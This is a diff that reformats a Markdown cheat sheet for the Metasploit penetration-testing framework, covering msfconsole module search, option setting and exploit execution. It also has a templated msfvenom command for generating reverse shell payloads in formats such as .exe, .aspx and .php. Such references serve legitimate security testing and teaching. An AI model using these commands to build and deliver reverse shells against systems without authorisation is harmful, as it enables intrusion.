@@ -1,54 +1,57 @@
-# 🌊 Metasploit
+## 🌊 Metasploit Fundamentals
 
-Welcome to the reference guide for Metasploit usage.
+> **Warning:** A standard shell and a Meterpreter session maintain distinct operational capabilities. Validate both listener and reverse shell configurations independently if initial execution fails.
 
-> [!WARNING]
-> A shell and a meterpreter are not the same things.\
-> Be sure to test both if one is not working, both listenner and reverse shell.\
+## 🏝️ MSFconsole Operations
 
----
+Initialize the framework console environment.
 
-## 🏝️ MSF console
+```bash
+# Launch the primary Metasploit console interface
+msfconsole
+```
+* Tool: MSFconsole
 
-- Open console\
-`msfconsole`
+Query the framework database for specific exploits, payloads, or auxiliary modules.
 
-- Search metasploit exploit\
-`search <name>`
+```bash
+# Search the framework for target modules using keywords
+search <query_string>
+```
+* Tool: MSFconsole
 
-- Show the options need to exploit\
-`show options`
+Display the configurable parameters required for the active module.
 
-- Use option\
-`set <option> <value>`
+```bash
+# List environment variables and required settings for the loaded module
+show options
+```
+* Tool: MSFconsole
 
-- Run exploit\
-`run`\
-`exploit`
+Assign values to specific module parameters.
 
----
+```bash
+# Define target variables or configuration settings
+set <OPTION_NAME> <VALUE>
+```
+* Tool: MSFconsole
 
-## 🐠 MSF venom
+Execute the active module against the configured target.
 
-- Default command\
-`msfvenom`
+```bash
+# Deploy the exploit or run the auxiliary module
+exploit
+# The 'run' command functions identically in this context
+run
+```
+* Tool: MSFconsole
 
-- Set a payload\
-`-p <payload-directory>`
+## 🐠 MSFvenom Payload Assembly
 
-- Set local host\
-`LHOST=<ip>`
+Generate custom payloads for various architectures and platforms. Common output formats include .exe, .aspx, .sh, .php, and .dll.
 
-- Set local port\
-`LPORT=<port>`
-
-- Set the outpout name\
-`-o <name.extension>`
-
-- Set the outpout format\
-`-f <format>`
-> [!NOTE]
-> You can use format like .exe .aspx .sh .php .dll
-
-
----
+```bash
+# Generate a customized reverse shell payload and output to a specific file format
+msfvenom -p <payload_identifier> LHOST=<local_ip_address> LPORT=<local_listening_port> -f <output_format> -o <target_filename.extension>
+```
+* Tool: MSFvenom
